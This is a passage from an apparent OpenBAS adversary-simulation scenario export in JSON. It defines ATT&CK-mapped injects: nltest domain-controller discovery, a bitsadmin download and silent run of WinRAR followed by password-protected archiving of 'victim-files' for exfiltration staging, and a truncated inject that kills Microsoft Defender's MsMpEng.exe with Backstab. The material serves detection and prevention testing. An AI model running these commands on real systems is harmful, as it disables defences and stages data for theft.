      "injector_contract_id" : "139e69d2-8e3d-4f22-a97b-ed5bf6d54314",
      "injector_contract_labels" : {
        "en" : "Remote System Discovery - nltest",
        "fr" : "Remote System Discovery - nltest"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Remote System Discovery - nltest\",\"fr\":\"Remote System Discovery - nltest\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"},{\"key\":\"target_domain\",\"label\":\"target_domain\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"%userdnsdomain%\",\"type\":\"text\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"139e69d2-8e3d-4f22-a97b-ed5bf6d54314\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "be5ed5ff-4ba3-4026-918b-794bad346638",
        "payload_type" : "Command",
        "payload_name" : "Remote System Discovery - nltest",
        "payload_description" : "Identify domain controllers for specified domain.\n\nUpon successful execution, cmd.exe will execute nltest.exe against a target domain to retrieve a list of domain controllers. Output will be via stdout.\n",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "853024a5-e051-4d81-b63a-1cdde660a397",
          "attack_pattern_name" : "Remote System Discovery",
          "attack_pattern_description" : "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  [Ping](https://attack.mitre.org/software/S0097), <code>net view</code> using [Net](https://attack.mitre.org/software/S0039), or, on ESXi servers, `esxcli network diag ping`.\n\nAdversaries may also analyze data from local host files (ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> or <code>/etc/hosts</code>) or other passive means (such as local [Arp](https://attack.mitre.org/software/S0099) cache entries) in order to discover the presence of remote systems in an environment.\n\nAdversaries may also target discovery of network infrastructure as well as leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands on network devices to gather detailed information about systems within a network (e.g. <code>show cdp neighbors</code>, <code>show arp</code>).(Citation: US-CERT-TA18-106A)(Citation: CISA AR21-126A FIVEHANDS May 2021)  \n",
          "attack_pattern_external_id" : "T1018",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "e0a815b3-1d61-4145-915a-d17482f5887d",
            "phase_external_id" : "TA0007",
            "phase_stix_id" : "x-mitre-tactic--c17c5845-175e-4421-9713-829d0573dbc9",
            "phase_name" : "Discovery",
            "phase_shortname" : "discovery",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "phase_order" : 8
          } ]
        } ],
        "payload_cleanup_executor" : null,
        "payload_cleanup_command" : null,
        "payload_elevation_required" : false,
        "payload_arguments" : [ {
          "type" : "text",
          "key" : "target_domain",
          "default_value" : "%userdnsdomain%",
          "description" : null,
          "separator" : null
        } ],
        "payload_prerequisites" : [ ],
        "payload_external_id" : "52ab5108-3f6f-42fb-8ba3-73bc054f22c8",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:12:48.555382Z",
        "payload_updated_at" : "2025-07-03T14:50:59.728581Z",
        "command_executor" : "cmd",
        "command_content" : "nltest.exe /dclist:#{target_domain}\n",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:12:48.568619Z",
      "injector_contract_updated_at" : "2024-12-12T08:12:48.568619Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "853024a5-e051-4d81-b63a-1cdde660a397",
        "attack_pattern_name" : "Remote System Discovery",
        "attack_pattern_description" : "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  [Ping](https://attack.mitre.org/software/S0097), <code>net view</code> using [Net](https://attack.mitre.org/software/S0039), or, on ESXi servers, `esxcli network diag ping`.\n\nAdversaries may also analyze data from local host files (ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> or <code>/etc/hosts</code>) or other passive means (such as local [Arp](https://attack.mitre.org/software/S0099) cache entries) in order to discover the presence of remote systems in an environment.\n\nAdversaries may also target discovery of network infrastructure as well as leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands on network devices to gather detailed information about systems within a network (e.g. <code>show cdp neighbors</code>, <code>show arp</code>).(Citation: US-CERT-TA18-106A)(Citation: CISA AR21-126A FIVEHANDS May 2021)  \n",
        "attack_pattern_external_id" : "T1018",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "e0a815b3-1d61-4145-915a-d17482f5887d",
          "phase_external_id" : "TA0007",
          "phase_stix_id" : "x-mitre-tactic--c17c5845-175e-4421-9713-829d0573dbc9",
          "phase_name" : "Discovery",
          "phase_shortname" : "discovery",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
          "phase_order" : 8
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "55467401-642a-4409-bdc6-91b451d90b9c",
    "inject_title" : "Compress Data and lock with password for Exfiltration with winrar",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ],
      "rar_installer" : "%TEMP%\\winrar.exe",
      "rar_exe" : "%programfiles%/WinRAR/Rar.exe"
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ ],
    "inject_depends_duration" : 1560,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "Compress Data and lock with password for Exfiltration with winrar",
          "fr" : "Compress Data and lock with password for Exfiltration with winrar"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        }, {
          "key" : "rar_installer",
          "label" : "rar_installer",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "%TEMP%\\winrar.exe",
          "type" : "text"
        }, {
          "key" : "rar_exe",
          "label" : "rar_exe",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "%programfiles%/WinRAR/Rar.exe",
          "type" : "text"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "e66f088b-aa74-4b87-82e2-59d7f8c7da58",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "e66f088b-aa74-4b87-82e2-59d7f8c7da58",
      "injector_contract_labels" : {
        "en" : "Compress Data and lock with password for Exfiltration with winrar",
        "fr" : "Compress Data and lock with password for Exfiltration with winrar"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Compress Data and lock with password for Exfiltration with winrar\",\"fr\":\"Compress Data and lock with password for Exfiltration with winrar\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"},{\"key\":\"rar_installer\",\"label\":\"rar_installer\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"%TEMP%\\\\winrar.exe\",\"type\":\"text\"},{\"key\":\"rar_exe\",\"label\":\"rar_exe\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"%programfiles%/WinRAR/Rar.exe\",\"type\":\"text\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"e66f088b-aa74-4b87-82e2-59d7f8c7da58\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "e1300777-f6a2-4fc3-ab1c-76ed82eeb32d",
        "payload_type" : "Command",
        "payload_name" : "Compress Data and lock with password for Exfiltration with winrar",
        "payload_description" : "Note: Requires winrar installation\nrar a -p\"blue\" hello.rar (VARIANT)\n",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "ebbb4608-23d9-4fd7-b099-0983910d6dfd",
          "attack_pattern_name" : "Archive via Utility",
          "attack_pattern_description" : "Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation: diantz.exe_lolbas) <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use [certutil](https://attack.mitre.org/software/S0160) to Base64 encode collected data before exfiltration. \n\nAdversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation: WinZip Homepage)",
          "attack_pattern_external_id" : "T1560.001",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "304030e2-2bb4-4236-8e56-68d81468de1e",
            "phase_external_id" : "TA0009",
            "phase_stix_id" : "x-mitre-tactic--d108ce10-2419-4cf9-a774-46161d6c6cfe",
            "phase_name" : "Collection",
            "phase_shortname" : "collection",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to either steal (exfiltrate) the data or to use the data to gain more information about the target environment. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.",
            "phase_order" : 10
          } ]
        } ],
        "payload_cleanup_executor" : null,
        "payload_cleanup_command" : null,
        "payload_elevation_required" : false,
        "payload_arguments" : [ {
          "type" : "text",
          "key" : "rar_installer",
          "default_value" : "%TEMP%\\winrar.exe",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "rar_exe",
          "default_value" : "%programfiles%/WinRAR/Rar.exe",
          "description" : null,
          "separator" : null
        } ],
        "payload_prerequisites" : [ {
          "executor" : "cmd",
          "get_command" : "echo Downloading Winrar installer\nbitsadmin /transfer myDownloadJob /download /priority normal \"https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe\" #{rar_installer}\n#{rar_installer} /S\n",
          "check_command" : "if not exist \"#{rar_exe}\" (exit /b 1)\n",
          "description" : "Rar tool must be installed at specified location (#{rar_exe})\n"
        } ],
        "payload_external_id" : "8dd61a55-44c6-43cc-af0c-8bdda276860c",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:12:24.819687Z",
        "payload_updated_at" : "2025-07-03T14:48:59.211522Z",
        "command_executor" : "cmd",
        "command_content" : "mkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"#{rar_exe}\" a -hp\"blue\" hello.rar\ndir\n",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:12:24.833119Z",
      "injector_contract_updated_at" : "2024-12-12T08:12:24.833119Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "ebbb4608-23d9-4fd7-b099-0983910d6dfd",
        "attack_pattern_name" : "Archive via Utility",
        "attack_pattern_description" : "Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation: diantz.exe_lolbas) <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use [certutil](https://attack.mitre.org/software/S0160) to Base64 encode collected data before exfiltration. \n\nAdversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation: WinZip Homepage)",
        "attack_pattern_external_id" : "T1560.001",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "304030e2-2bb4-4236-8e56-68d81468de1e",
          "phase_external_id" : "TA0009",
          "phase_stix_id" : "x-mitre-tactic--d108ce10-2419-4cf9-a774-46161d6c6cfe",
          "phase_name" : "Collection",
          "phase_shortname" : "collection",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to either steal (exfiltrate) the data or to use the data to gain more information about the target environment. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.",
          "phase_order" : 10
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "529bf9a1-931c-43bb-8c53-86442616d430",
    "inject_title" : "Kill antimalware protected processes using Backstab",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ],
      "process_name" : "MsMpEng.exe",
      "PathToAtomicsFolder\\__\\ExternalPayloads_path" : "./ExternalPayloads/../ExternalPayloads",
      "PathToAtomicsFolder\\__\\ExternalPayloads\\Backstab64_exe_path" : "./ExternalPayloads/../ExternalPayloads/Backstab64.exe"
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ ],
    "inject_depends_duration" : 1260,
    "inject_injector_contract" : {
      "convertedContent" : {
